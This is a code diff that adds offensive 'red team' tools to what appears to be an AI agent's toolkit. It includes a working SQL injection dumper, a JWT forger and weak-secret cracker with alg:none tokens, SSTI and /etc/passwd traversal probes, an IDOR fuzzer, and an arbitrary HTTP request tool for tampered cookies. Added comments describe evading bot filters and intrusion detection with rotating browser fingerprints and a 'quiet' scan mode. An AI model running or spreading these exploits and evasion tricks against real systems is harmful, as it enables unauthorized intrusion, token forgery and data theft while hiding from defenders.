@@ -7075,7 +7075,8 @@ _RECON_PORT_NAMES = {
 
 
 def _recon_clean_host(raw: str) -> str:
-    """Strip scheme/path/query/port and whitespace; return the bare host."""
+    """Strip scheme/path/query/port and whitespace; return the bare host.
+    (For DNS/TLS/crt.sh callers that genuinely need a bare hostname.)"""
     h = (raw or "").strip()
     if "://" in h:
         h = h.split("://", 1)[1]
@@ -7083,6 +7084,34 @@ def _recon_clean_host(raw: str) -> str:
     if h.count(":") == 1:  # drop a trailing :port
         h = h.split(":", 1)[0]
     return h.strip().strip(".")
+
+
+def _recon_prep_url(raw: str) -> str:
+    """Normalize a target into a full HTTP(S) URL for the recon HTTP tools,
+    PRESERVING an explicit scheme, port, and path. When no scheme is given,
+    choose one by target: http for localhost / *.local / private IPs / an
+    explicit non-443 port (internal services and this range are plain HTTP);
+    https otherwise. This is what lets a bare `127.0.0.1` or `host:8080` target
+    actually work instead of failing a TLS handshake against an HTTP port -
+    previously these tools blindly prepended https:// and dropped the port,
+    which silently broke every internal/local assessment."""
+    import ipaddress
+    raw = (raw or "").strip()
+    if raw.startswith(("http://", "https://")):
+        return raw
+    hostport = raw.split("/", 1)[0]
+    rest = raw[len(hostport):]  # path/query, if any
+    host = hostport.split(":", 1)[0]
+    port = hostport.split(":", 1)[1] if hostport.count(":") == 1 else ""
+    is_local = host in ("localhost", "") or host.endswith(".local")
+    if not is_local:
+        try:
+            ip = ipaddress.ip_address(host)
+            is_local = ip.is_private or ip.is_loopback or ip.is_link_local
+        except ValueError:
+            pass
+    scheme = "http" if (is_local or (port and port != "443")) else "https"
+    return f"{scheme}://{hostport}{rest}"
 
 
 def _recon_resolve(host: str) -> dict:
@@ -7289,8 +7318,7 @@ def tool_recon_http_fingerprint(args: dict) -> dict:
     url = (args.get("url") or args.get("target") or "").strip()
     if not url:
         return {"error": "url required"}
-    if not url.startswith(("http://", "https://")):
-        url = "https://" + _recon_clean_host(url)
+    url = _recon_prep_url(url)
     timeout = max(2.0, min(float(args.get("timeout") or 8.0), 20.0))
 
     class _NoRedirect(urllib.request.HTTPRedirectHandler):
@@ -7300,7 +7328,9 @@ def tool_recon_http_fingerprint(args: dict) -> dict:
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    # Rotating real-browser identity (same stack as http_request) so the
+    # fingerprint probe blends in instead of announcing a static old UA.
+    _fp_headers = _browser_headers(_pick_profile(urllib.parse.urlparse(url).netloc))
     opener = urllib.request.build_opener(_NoRedirect, urllib.request.HTTPSHandler(context=ctx))
     chain = []
     cur = url
@@ -7308,7 +7338,7 @@ def tool_recon_http_fingerprint(args: dict) -> dict:
     status = None
     body = ""
     for _ in range(6):
-        req = urllib.request.Request(cur, headers={"User-Agent": ua})
+        req = urllib.request.Request(cur, headers=_fp_headers)
         try:
             resp = opener.open(req, timeout=timeout)
             status = resp.status
@@ -7441,6 +7471,14 @@ _RECON_COMMON_PATHS = [
 ]
 
 
+# Highest-signal subset for quiet mode — a handful of the most likely wins so a
+# stealthy sweep sends ~10 requests instead of ~50.
+_RECON_QUIET_PATHS = [
+    ".env", ".git/config", ".git/HEAD", "admin/", "login", "api/",
+    "config.json", "backup.zip", "actuator/env", "robots.txt",
+]
+
+
 _RECON_WAF_MARKERS = [
     "attention required! | cloudflare", "/cdn-cgi/", "cf-error-details",
     "you have been blocked", "request blocked", "access denied",
@@ -7497,14 +7535,22 @@ def tool_recon_content_discovery(args: dict) -> dict:
     base = (args.get("url") or args.get("target") or "").strip()
     if not base:
         return {"error": "url required"}
-    if not base.startswith(("http://", "https://")):
-        base = "https://" + _recon_clean_host(base)
+    base = _recon_prep_url(base)
     base = base.rstrip("/") + "/"
-    paths = args.get("wordlist") or list(_RECON_COMMON_PATHS)
-    random.shuffle(paths)
     timeout = max(2.0, min(float(args.get("timeout") or 6.0), 15.0))
-    concurrency = max(1, min(int(args.get("concurrency") or 6), 20))
-    jitter_ms = max(0, min(int(args.get("jitter_ms") or 60), 1000))
+    # Quiet mode: a small, highest-signal path set + low concurrency. A content
+    # IDS scores REQUESTS (not timing), so a smaller footprint = fewer chances to
+    # trip the "active scanning" signature. This is the stealth lever that
+    # actually works against a content sensor (jitter does not).
+    if args.get("quiet"):
+        paths = args.get("wordlist") or list(_RECON_QUIET_PATHS)
+        concurrency = 2
+        jitter_ms = max(200, min(int(args.get("jitter_ms") or 200), 1000))
+    else:
+        paths = args.get("wordlist") or list(_RECON_COMMON_PATHS)
+        concurrency = max(1, min(int(args.get("concurrency") or 6), 20))
+        jitter_ms = max(0, min(int(args.get("jitter_ms") or 60), 1000))
+    random.shuffle(paths)
     baseline = _recon_baseline(base, timeout)
 
     def probe(path):
@@ -7547,8 +7593,7 @@ def tool_recon_check_exposure(args: dict) -> dict:
     base = (args.get("url") or args.get("target") or "").strip()
     if not base:
         return {"error": "url required"}
-    if not base.startswith(("http://", "https://")):
-        base = "https://" + _recon_clean_host(base)
+    base = _recon_prep_url(base)
     base = base.rstrip("/") + "/"
     timeout = max(2.0, min(float(args.get("timeout") or 7.0), 15.0))
     findings = []
@@ -7736,8 +7781,7 @@ def tool_recon_injection_probe(args: dict) -> dict:
     url = (args.get("url") or args.get("target") or "").strip()
     if not url:
         return {"error": "url required"}
-    if not url.startswith(("http://", "https://")):
-        url = "https://" + _recon_clean_host(url)
+    url = _recon_prep_url(url)
     parsed = urllib.parse.urlparse(url)
     qs = dict(urllib.parse.parse_qsl(parsed.query))
     names = args.get("params") or list(qs.keys())
@@ -7770,6 +7814,24 @@ def tool_recon_injection_probe(args: dict) -> dict:
         if hit:
             findings.append({"param": param, "type": "error-based SQLi",
                              "severity": "high", "evidence": f"SQL error signature: '{hit}'"})
+        # SSTI: a distinctive arithmetic marker (1337*1337 = 1787569) that only
+        # appears if the value is evaluated as a template. Try the common engine
+        # syntaxes; require the RESULT present and the raw expression absent.
+        for probe_val, engine in (("{{1337*1337}}", "jinja/twig"),
+                                  ("${1337*1337}", "el/freemarker/spel"),
+                                  ("<%= 1337*1337 %>", "erb/ejs")):
+            rs = _recon_fetch(build(param, probe_val), timeout=timeout, max_bytes=20000)
+            rb = rs.get("body") or ""
+            if "1787569" in rb and probe_val not in rb:
+                findings.append({"param": param, "type": "server-side template injection (SSTI)",
+                                 "severity": "critical",
+                                 "evidence": f"{probe_val} evaluated to 1787569 ({engine})"})
+                break
+        # path traversal / LFI: a classic /etc/passwd read
+        rl = _recon_fetch(build(param, "../../../../../../etc/passwd"), timeout=timeout, max_bytes=20000)
+        if re.search(r"root:.*:0:0:", rl.get("body") or ""):
+            findings.append({"param": param, "type": "path traversal / LFI",
+                             "severity": "high", "evidence": "/etc/passwd contents returned"})
 
     return {"url": url, "tested_params": names, "finding_count": len(findings),
             "findings": findings or [{"type": "none", "severity": "info",
@@ -7900,8 +7962,7 @@ def tool_recon_auth_spray(args: dict) -> dict:
     url = (args.get("url") or args.get("target") or "").strip()
     if not url:
         return {"error": "url required"}
-    if not url.startswith(("http://", "https://")):
-        url = "https://" + _recon_clean_host(url)
+    url = _recon_prep_url(url)
     mode = (args.get("mode") or "basic").lower()
     if mode not in ("basic", "form"):
         return {"error": "mode must be 'basic' or 'form'"}
@@ -8007,6 +8068,681 @@ def tool_recon_capture_evidence(args: dict) -> dict:
         "note": ("evidence stored — cite this artifact path + sha256 in the report." if likely
                  else "stored, but this does NOT look like a real artifact — see `warning`."),
     }
+
+
+# Per-"session" cookie jars for http_request. Opt-in via the `session` arg so a
+# model can carry auth across requests without re-passing cookies each time -
+# while the default (no session) stays explicit so the cookie-tamper step is
+# never hidden. Keyed by an arbitrary session name the model chooses.
+_HTTP_SESSIONS: dict[str, dict] = {}
+
+
+def _save_http_request_evidence(label, method, url, req_headers, req_body,
+                                status, resp_headers, resp_body) -> dict | None:
+    """Persist a full request+response transcript as a proof artifact under
+    data/recon_evidence/ with a sha256. Unlike recon_capture_evidence (a bare
+    GET), this captures the ACTUAL exploit request - forged cookies, POST body,
+    injected payload - so a breach is verifiable and the report can cite it."""
+    import hashlib
+    evidence_dir = DATA / "recon_evidence"
+    try:
+        evidence_dir.mkdir(parents=True, exist_ok=True)
+    except Exception:
+        return None
+    ts = time.strftime("%Y%m%d-%H%M%S")
+    safe_label = re.sub(r"[^A-Za-z0-9_.-]", "_", str(label or "http_evidence"))[:60]
+    host = re.sub(r"[^A-Za-z0-9_.-]", "_", urllib.parse.urlparse(url).netloc or "target")
+    path = evidence_dir / f"{ts}_{safe_label}_{host}.txt"
+    lines = ["### REQUEST", f"{method} {url}"]
+    for k, v in (req_headers or {}).items():
+        lines.append(f"{k}: {v}")
+    if req_body:
+        lines.append("")
+        lines.append(req_body if isinstance(req_body, str) else req_body.decode("utf-8", "replace"))
+    lines += ["", "### RESPONSE", f"HTTP {status}"]
+    for k, v in (resp_headers or {}).items():
+        lines.append(f"{k}: {v}")
+    lines += ["", resp_body or ""]
+    transcript = "\n".join(lines)
+    try:
+        path.write_text(transcript, encoding="utf-8")
+    except Exception:
+        return None
+    return {"evidence_saved": str(path),
+            "evidence_sha256": hashlib.sha256(transcript.encode("utf-8", "replace")).hexdigest()}
+
+
+def tool_http_request(args: dict) -> dict:
+    """AUTHORIZED PENTEST. Send an arbitrary HTTP request (method, url, headers,
+    cookies, body) and return status + headers + body. This is the standard
+    pentest primitive — the curl / Burp Repeater equivalent — that lets the
+    "find a way in" flow chain real exploit steps the read-only recon tools
+    cannot: decode+flip+re-encode a session cookie, aim an SSRF url parameter,
+    POST an SSTI payload, replay a request with a tampered header.
+
+    It wears a real, rotating browser fingerprint (from the same profile pool as
+    the rest of the suite) so it blends in and gets past bot filters. Crucially
+    it returns the FULL response — status, ALL response headers (every Set-Cookie
+    preserved), and body — because reading a Set-Cookie, a redirect Location, or
+    a 500 stack trace is usually the whole point of a finding. Non-2xx responses
+    are returned immediately, not retried: unlike a scraper, an exploitation tool
+    must SEE a 401/403/404/405 (they are the signal), so we only rotate-and-retry
+    on transient blocks (429/503) and connection errors. The identity used is
+    returned so the model and the logs can see what it looked like on the wire.
+    Gated behind red_team_enabled."""
+    if not get_settings().get("red_team_enabled"):
+        return {"error": "red team tools are disabled. Enable them in Settings."}
+    url = (args.get("url") or args.get("target") or "").strip()
+    if not url:
+        return {"error": "url required"}
+    # Range/internal targets are plain HTTP; default to http:// when no scheme
+    # is given (recon tools default to https, which is wrong for a local range).
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
+
+    headers: dict = {}
+    for k, v in (args.get("headers") or {}).items():
+        headers[str(k)] = str(v)
+    # Optional cookie jar: when a `session` name is given, we merge previously
+    # captured cookies for that session (explicit `cookies` still win) and, on
+    # the way back, remember any Set-Cookie the server sends. Opt-in so the
+    # default stays explicit and the deliberate cookie-tamper step is never
+    # auto-hidden.
+    session = args.get("session")
+    cookies = dict(args.get("cookies") or {})
+    if session:
+        merged = dict(_HTTP_SESSIONS.get(str(session), {}))
+        merged.update(cookies)  # explicit cookies override the jar
+        cookies = merged
+    if cookies and not any(k.lower() == "cookie" for k in headers):
+        headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
+
+    body = args.get("body")
+    if isinstance(body, (dict, list)):
+        body = json.dumps(body, ensure_ascii=False)
+        headers.setdefault("Content-Type", "application/json")
+    data = body.encode("utf-8") if isinstance(body, str) and body else None
+    # Method defaults to POST when a body is present, else GET.
+    method = (args.get("method") or ("POST" if data else "GET")).upper()
+    # A raw body with no content type is almost always form-encoded here.
+    if data and not any(k.lower() == "content-type" for k in headers):
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+    timeout = max(2.0, min(float(args.get("timeout") or 15.0), 30.0))
+
+    def _headers_of(msg) -> tuple[dict, list]:
+        """Response headers as a dict, plus the FULL list of Set-Cookie values
+        kept separately (a dict would collapse multiple Set-Cookie headers into
+        one, and the session cookie is exactly what a cookie-tamper finding
+        needs)."""
+        hdrs = {k: v for k, v in msg.items()}
+        return hdrs, (msg.get_all("Set-Cookie") or [])
+
+    def _absorb_cookies(set_cookie_list) -> None:
+        """Fold response Set-Cookie values into the named session jar (opt-in)."""
+        if not session:
+            return
+        jar = _HTTP_SESSIONS.setdefault(str(session), {})
+        for sc in set_cookie_list or []:
+            nv = sc.split(";", 1)[0].strip()
+            if "=" in nv:
+                cn, cv = nv.split("=", 1)
+                jar[cn.strip()] = cv.strip()
+
+    # Browser-identity rotation for evasion, but we capture the RESPONSE HEADERS
+    # ourselves (the shared _open_with_rotation drops them). Retry only transient
+    # blocks; every other status is returned so the model can read it.
+    host = ""
+    try:
+        host = urllib.parse.urlparse(url).netloc
+    except Exception:
+        pass
+    tried: list = []
+    last_exc: Exception | None = None
+    attempts = 3
+    for attempt in range(attempts):
+        profile = _pick_profile(host, exclude=tried[-1] if tried else None)
+        tried.append(profile)
+        req_headers = _browser_headers(profile, accept_html=True)
+        req_headers.update(headers)  # caller-supplied headers/cookies win
+        try:
+            req = urllib.request.Request(url, data=data, method=method, headers=req_headers)
+            with urllib.request.urlopen(req, timeout=timeout) as resp:
+                status = getattr(resp, "status", 200) or 200
+                resp_headers, set_cookie = _headers_of(resp.headers)
+                raw = resp.read(1024 * 1024)
+                final_url = resp.geturl()
+            resp_body_text = raw.decode("utf-8", "replace")
+            _absorb_cookies(set_cookie)
+            result = {
+                "ok": True, "status": status, "method": method, "url": url,
+                "final_url": final_url,
+                "content_type": resp_headers.get("Content-Type", ""),
+                "headers": resp_headers,
+                "set_cookie": set_cookie,  # every Set-Cookie the server sent
+                "body": resp_body_text,
+                "user_agent": profile.get("ua", ""),  # identity we blended in as
+            }
+            if session:
+                result["session_cookies"] = dict(_HTTP_SESSIONS.get(str(session), {}))
+            if args.get("save_evidence"):
+                ev = _save_http_request_evidence(
+                    args.get("evidence_label") or args.get("save_evidence"),
+                    method, url, req_headers, data, status, resp_headers, resp_body_text)
+                if ev:
+                    result.update(ev)
+            return result
+        except urllib.error.HTTPError as e:
+            resp_headers, set_cookie = _headers_of(e.headers)
+            try:
+                body_txt = e.read().decode("utf-8", "replace")
+            except Exception:
+                body_txt = ""
+            # Only 429/503 are worth rotating past; 401/403/404/405/5xx are the
+            # finding itself and are returned immediately.
+            if e.code in (429, 503) and attempt < attempts - 1:
+                last_exc = e
+                time.sleep(0.4 + random.random() * 0.6)
+                continue
+            _absorb_cookies(set_cookie)  # a 302 login still sets cookies
+            result = {
+                "ok": False, "status": e.code, "method": method, "url": url,
+                "content_type": resp_headers.get("Content-Type", ""),
+                "headers": resp_headers,
+                "set_cookie": set_cookie,
+                "body": body_txt,
+                "user_agent": profile.get("ua", ""),
+                "note": f"HTTP {e.code}",
+            }
+            if session:
+                result["session_cookies"] = dict(_HTTP_SESSIONS.get(str(session), {}))
+            if args.get("save_evidence"):
+                ev = _save_http_request_evidence(
+                    args.get("evidence_label") or args.get("save_evidence"),
+                    method, url, req_headers, data, status, resp_headers, body_txt)
+                if ev:
+                    result.update(ev)
+            return result
+        except Exception as e:
+            # Connection-level failure (DNS, timeout, reset): retry with a fresh
+            # identity, then give up.
+            last_exc = e
+            time.sleep(0.3 + random.random() * 0.4)
+            continue
+    return {"error": f"request failed: {last_exc}", "url": url, "method": method}
+
+
+def tool_encode_decode(args: dict) -> dict:
+    """AUTHORIZED PENTEST. Encode or decode a string with the common web-app
+    schemes — base64 / base64url, URL percent-encoding, hex, and JWT segment
+    decode. This is the Burp "Decoder" equivalent: it lets the model inspect and
+    FORGE tokens (decode an unsigned session cookie, flip a field, re-encode it)
+    without doing base64 by hand — the mechanical step that otherwise walls small
+    models even when they understand the vulnerability. Pure string transform, no
+    I/O. Gated behind red_team_enabled.
+
+    args: text (the string), scheme (base64|base64url|url|hex|jwt, default
+    base64), operation (encode|decode, default encode). base64 encode returns
+    BOTH the standard and url-safe alphabets so the caller can match whatever the
+    app expects (unsigned cookies commonly use url-safe)."""
+    # Module aliases the stdlib as `_b64` (import base64 as _b64), so a bare
+    # `base64.` name isn't bound here — import it locally, as other tools do.
+    import base64
+    if not get_settings().get("red_team_enabled"):
+        return {"error": "red team tools are disabled. Enable them in Settings."}
+    text = args.get("text")
+    if text is None:
+        text = args.get("input") or args.get("value") or args.get("data") or ""
+    if not isinstance(text, str):
+        # A model may hand us a dict/list to encode (e.g. a forged cookie payload).
+        text = json.dumps(text, ensure_ascii=False, separators=(",", ":"))
+
+    scheme = (args.get("scheme") or args.get("format") or "base64").lower().strip()
+    op = (args.get("operation") or args.get("op") or "encode").lower().strip()
+    # Forgive the common synonyms small models invent.
+    scheme = {"b64": "base64", "base-64": "base64", "b64url": "base64url",
+              "base64-url": "base64url", "urlsafe": "base64url", "percent": "url",
+              "urlencode": "url", "url-encode": "url", "urlencoded": "url"}.get(scheme, scheme)
+    op = {"enc": "encode", "dec": "decode"}.get(op, op)
+
+    def _b64_decode(s: str) -> str:
+        # Accept either alphabet and tolerate stripped padding/whitespace.
+        s2 = "".join(s.split()).replace("-", "+").replace("_", "/")
+        return base64.b64decode(s2 + "=" * (-len(s2) % 4)).decode("utf-8", "replace")
+
+    try:
+        if scheme in ("base64", "base64url"):
+            if op == "decode":
+                return {"scheme": scheme, "operation": "decode", "result": _b64_decode(text)}
+            raw = text.encode("utf-8")
+            std = base64.b64encode(raw).decode("ascii")
+            urlsafe = base64.urlsafe_b64encode(raw).decode("ascii")
+            return {"scheme": scheme, "operation": "encode",
+                    "result": urlsafe if scheme == "base64url" else std,
+                    "base64": std, "base64url": urlsafe}
+        if scheme == "url":
+            if op == "decode":
+                return {"scheme": "url", "operation": "decode", "result": urllib.parse.unquote(text)}
+            return {"scheme": "url", "operation": "encode", "result": urllib.parse.quote(text, safe="")}
+        if scheme == "hex":
+            if op == "decode":
+                return {"scheme": "hex", "operation": "decode",
+                        "result": bytes.fromhex("".join(text.split())).decode("utf-8", "replace")}
+            return {"scheme": "hex", "operation": "encode", "result": text.encode("utf-8").hex()}
+        if scheme == "jwt":
+            # Always a decode: split header.payload.signature and decode the two
+            # base64url JSON segments. Signature is shown but NOT verified — the
+            # point is to inspect/forge, not validate.
+            parts = text.strip().split(".")
+            if len(parts) < 2:
+                return {"error": "not a JWT — expected header.payload.signature"}
+
+            def _seg(seg: str):
+                return json.loads(base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)).decode("utf-8", "replace"))
+
+            return {"scheme": "jwt", "operation": "decode",
+                    "header": _seg(parts[0]), "payload": _seg(parts[1]),
+                    "signature": parts[2] if len(parts) > 2 else "",
+                    "note": "signature NOT verified — inspect/forge only"}
+        return {"error": f"unknown scheme '{scheme}' — use base64, base64url, url, hex, or jwt"}
+    except Exception as e:
+        return {"error": f"{scheme} {op} failed: {e}", "input_preview": text[:120]}
+
+
+# Common weak HMAC secrets tried by the jwt_tool cracker. Small on purpose - a
+# real crack uses a big wordlist via the `wordlist` arg; this catches the
+# embarrassing-but-common defaults instantly.
+_JWT_WEAK_SECRETS = [
+    "secret", "password", "123456", "admin", "key", "jwt", "token", "changeme",
+    "secretkey", "secret123", "s3cr3t", "test", "root", "qwerty", "letmein",
+    "your-256-bit-secret", "your_jwt_secret", "supersecret", "private",
+    "jwtsecret", "mysecret", "default", "hmac", "signature", "",
+]
+
+
+def tool_jwt_tool(args: dict) -> dict:
+    """AUTHORIZED PENTEST. Decode, forge (sign), or crack a JSON Web Token - the
+    bread-and-butter of modern auth attacks. Operations:
+      decode : split + base64url-decode header & payload (no verification).
+      sign   : build a signed token from `payload` (JSON object) with `secret`
+               and `alg` (HS256|HS384|HS512|none). alg=none produces an unsigned
+               token for the classic alg-confusion downgrade.
+      crack  : brute a token's HMAC `secret` against a built-in weak list plus
+               your optional `wordlist`. On a hit, forge with operation=sign.
+    Gated behind red_team_enabled."""
+    if not get_settings().get("red_team_enabled"):
+        return {"error": "red team tools are disabled. Enable them in Settings."}
+    import base64
+    import hashlib
+    import hmac as _hmac
+
+    op = (args.get("operation") or args.get("op") or "decode").lower().strip()
+    algs = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+
+    def b64url_enc(b: bytes) -> str:
+        return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")
+
+    def b64url_dec(s: str) -> bytes:
+        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
+
+    try:
+        if op == "decode":
+            token = (args.get("token") or args.get("text") or "").strip()
+            parts = token.split(".")
+            if len(parts) < 2:
+                return {"error": "not a JWT — expected header.payload.signature"}
+            return {"operation": "decode",
+                    "header": json.loads(b64url_dec(parts[0])),
+                    "payload": json.loads(b64url_dec(parts[1])),
+                    "signature": parts[2] if len(parts) > 2 else "",
+                    "note": "signature NOT verified — inspect/forge only"}
+
+        if op in ("sign", "encode", "forge"):
+            payload = args.get("payload")
+            if isinstance(payload, str):
+                try:
+                    payload = json.loads(payload)
+                except Exception:
+                    return {"error": "payload must be a JSON object (e.g. {\"user\":\"admin\"})"}
+            if not isinstance(payload, dict):
+                return {"error": "payload (a JSON object) is required to sign"}
+            alg = (args.get("alg") or "HS256").upper()
+            # alg:none must be encoded canonically lowercase, or servers that do
+            # the classic downgrade check (alg == "none") won't accept it.
+            header_alg = "none" if alg == "NONE" else alg
+            header = args.get("header") or {}
+            if isinstance(header, str):
+                try:
+                    header = json.loads(header)
+                except Exception:
+                    header = {}
+            header.setdefault("alg", header_alg)
+            header.setdefault("typ", "JWT")
+            signing_input = (b64url_enc(json.dumps(header, separators=(",", ":")).encode()) + "." +
+                             b64url_enc(json.dumps(payload, separators=(",", ":")).encode()))
+            if alg == "NONE":
+                return {"operation": "sign", "alg": "none", "token": signing_input + ".",
+                        "note": "unsigned (alg:none) token — works only against servers that accept it"}
+            if alg not in algs:
+                return {"error": f"unsupported alg '{alg}' — use HS256, HS384, HS512, or none"}
+            secret = args.get("secret")
+            if secret is None:
+                return {"error": "secret required to HMAC-sign (or use alg=none)"}
+            sig = _hmac.new(str(secret).encode(), signing_input.encode(), algs[alg]).digest()
+            return {"operation": "sign", "alg": alg, "token": signing_input + "." + b64url_enc(sig)}
+
+        if op == "crack":
+            token = (args.get("token") or args.get("text") or "").strip()
+            parts = token.split(".")
+            if len(parts) != 3:
+                return {"error": "crack needs a full header.payload.signature token"}
+            try:
+                header = json.loads(b64url_dec(parts[0]))
+            except Exception:
+                return {"error": "could not decode token header"}
+            alg = (header.get("alg") or "HS256").upper()
+            if alg not in algs:
+                return {"error": f"crack supports HMAC algs only (token uses '{alg}')"}
+            signing_input = (parts[0] + "." + parts[1]).encode()
+            want = parts[2]
+            wl = list(_JWT_WEAK_SECRETS)
+            extra = args.get("wordlist")
+            if isinstance(extra, list):
+                wl += [str(x) for x in extra]
+            elif isinstance(extra, str):
+                wl += extra.split()
+            for cand in wl:
+                sig = b64url_enc(_hmac.new(cand.encode(), signing_input, algs[alg]).digest())
+                if _hmac.compare_digest(sig, want):
+                    return {"operation": "crack", "found": True, "secret": cand, "alg": alg,
+                            "note": "secret recovered — forge with operation=sign, secret=<this>"}
+            return {"operation": "crack", "found": False, "tried": len(wl), "alg": alg,
+                    "note": "no secret in the tested set — supply a larger `wordlist`"}
+
+        return {"error": f"unknown operation '{op}' — use decode, sign, or crack"}
+    except Exception as e:
+        return {"error": f"jwt {op} failed: {e}"}
+
+
+def tool_sql_injection(args: dict) -> dict:
+    """AUTHORIZED PENTEST. Semi-automated SQL injection on a GET query parameter
+    (sqlmap-lite). Handles the mechanical parts so the model only decides WHAT to
+    pull: probes error-based + boolean-based injectability, finds the UNION
+    column count automatically, and — if `extract` is given (a SELECT list,
+    optionally with FROM, e.g. "flag FROM secrets" or "name FROM sqlite_master
+    WHERE type='table'") — builds the padded UNION payload and returns the rows.
+    Pass `url` (with the target param) and optionally `param` (defaults to the
+    first query param). Gated behind red_team_enabled."""
+    if not get_settings().get("red_team_enabled"):
+        return {"error": "red team tools are disabled. Enable them in Settings."}
+    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
+    if not url or "?" not in url:
+        return {"error": "url with a query parameter required, e.g. http://host/search?q=test"}
+    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 15.0))
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    if not qs:
+        return {"error": "no query parameter to inject"}
+    param = args.get("param") or qs[0][0]
+    base_val = dict(qs).get(param, "1")
+
+    def send(injection):
+        newqs = [(k, (injection if k == param else v)) for k, v in qs]
+        u = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(newqs)))
+        return _recon_fetch(u, timeout=timeout, max_bytes=20000)
+
+    def looks_error(body):
+        bl = (body or "").lower()
+        return ("sql error" in bl or "syntax error" in bl or
+                "do not have the same number" in bl or
+                any(sig in bl for sig in _RECON_SQL_ERRORS))
+
+    result = {"url": url, "param": param}
+    # injectability: error-based + boolean-based
+    result["error_based"] = looks_error(send(base_val + "'").get("body"))
+    t = send(base_val + "' AND '1'='1")
+    f = send(base_val + "' AND '1'='2")
+    result["boolean_based"] = ((t.get("body") or "") != (f.get("body") or "")
+                               and t.get("status") == f.get("status"))
+    result["injectable"] = result["error_based"] or result["boolean_based"]
+
+    # UNION column count: pad NULLs until the response is a clean, non-error 200
+    ncols = None
+    for n in range(1, 13):
+        r = send(base_val + "' UNION SELECT " + ",".join(["NULL"] * n) + "-- ")
+        if r.get("status") == 200 and not looks_error(r.get("body")):
+            ncols = n
+            break
+    result["union_columns"] = ncols
+
+    extract = (args.get("extract") or "").strip()
+    if extract:
+        if ncols is None:
+            result["note"] = ("couldn't fix UNION column count — extract manually via http_request "
+                              "(boolean/blind), or check the parameter is really UNION-injectable.")
+            return result
+        m = re.split(r"\s+from\s+", extract, maxsplit=1, flags=re.IGNORECASE)
+        select_part = m[0].strip()
+        from_part = (" FROM " + m[1].strip()) if len(m) > 1 else ""
+        pad = ",NULL" * max(0, ncols - (select_part.count(",") + 1))
+        payload = base_val + f"' UNION SELECT {select_part}{pad}{from_part}-- "
+        r = send(payload)
+        result.update({"payload": payload, "dump_status": r.get("status"),
+                       "dump_body": r.get("body", ""),
+                       "note": "extracted rows are in dump_body — the injected values are the ones "
+                               "absent from a normal query's results."})
+    else:
+        result["note"] = ("injectable — pass `extract` (e.g. 'flag FROM secrets', or enumerate schema "
+                          "with 'name FROM sqlite_master') to dump."
+                          if result["injectable"] else "no clear injection on this parameter.")
+    return result
+
+
+def tool_fuzz(args: dict) -> dict:
+    """AUTHORIZED PENTEST. Iterate a request parameter over many values and report
+    which responses DIFFER from the norm — the primitive for enumeration/IDOR
+    (find the one object id that leaks), parameter/endpoint brute forcing, and
+    access checks. Put FUZZ in the url where the value goes, OR pass `param`;
+    supply `values` (list) or `range`=[start,end] (integers). Returns the outlier
+    responses (status/size differ from the common baseline) so the interesting
+    one is obvious. Gated behind red_team_enabled."""
+    if not get_settings().get("red_team_enabled"):
+        return {"error": "red team tools are disabled. Enable them in Settings."}
+    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
+    if not url:
+        return {"error": "url required"}
+    param = args.get("param")
+    if "FUZZ" not in url and not param:
+        return {"error": "put FUZZ in the url where the value goes, or pass `param`"}
+    values = args.get("values")
+    rng = args.get("range")
+    if not values and isinstance(rng, list) and len(rng) == 2:
+        try:
+            values = [str(i) for i in range(int(rng[0]), int(rng[1]) + 1)]
+        except Exception:
+            return {"error": "range must be [start, end] integers"}
+    if not values:
+        return {"error": "provide `values` (list) or `range` [start, end]"}
+    values = [str(v) for v in values][:300]
+    timeout = max(2.0, min(float(args.get("timeout") or 6.0), 12.0))
+
+    def build(v):
+        if "FUZZ" in url:
+            return url.replace("FUZZ", urllib.parse.quote(v, safe=""))
+        p = urllib.parse.urlparse(url)
+        q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
+        q = ([(k, (v if k == param else vv)) for k, vv in q]
+             if any(k == param for k, _ in q) else q + [(param, v)])
+        return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q)))
+
+    def probe(v):
+        r = _recon_fetch(build(v), timeout=timeout, max_bytes=4000)
+        body = r.get("body", "") or ""
+        return {"value": v, "status": r.get("status"), "size": len(body),
+                "snippet": body[:140].replace("\n", " ")}
+
+    from collections import Counter
+    with ThreadPoolExecutor(max_workers=6, thread_name_prefix="fuzz") as ex:
+        results = list(ex.map(probe, values))
+    counts = Counter((r["status"], r["size"]) for r in results)
+    modal = counts.most_common(1)[0][0] if counts else None
+    distinct = [r for r in results if (r["status"], r["size"]) != modal]
+    return {"url": url, "tested": len(results),
+            "modal_response": ({"status": modal[0], "size": modal[1]} if modal else None),
+            "distinct_count": len(distinct), "distinct": distinct[:50],
+            "note": "the distinct responses differ from the common baseline — the outliers are "
+                    "where the interesting data (another user's object, a valid id) lives."}
+
+
+def tool_validate_finding(args: dict) -> dict:
+    """AUTHORIZED PENTEST. Sanity-check a suspected finding BEFORE reporting it, to
+    avoid false positives on decoys / catch-all pages / WAF blocks. Fetches the
+    url, diffs it against a random-path baseline, classifies the response, and
+    flags placeholder/decoy markers (example.invalid, 'placeholder', 'nothing
+    sensitive', lorem ipsum, …). Returns likely_real + reasons so you don't
+    report a honeypot. Read-only. Gated behind red_team_enabled."""
+    if not get_settings().get("red_team_enabled"):
+        return {"error": "red team tools are disabled. Enable them in Settings."}
+    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
+    if not url:
+        return {"error": "url required"}
+    timeout = max(2.0, min(float(args.get("timeout") or 7.0), 15.0))
+    parsed = urllib.parse.urlparse(url)
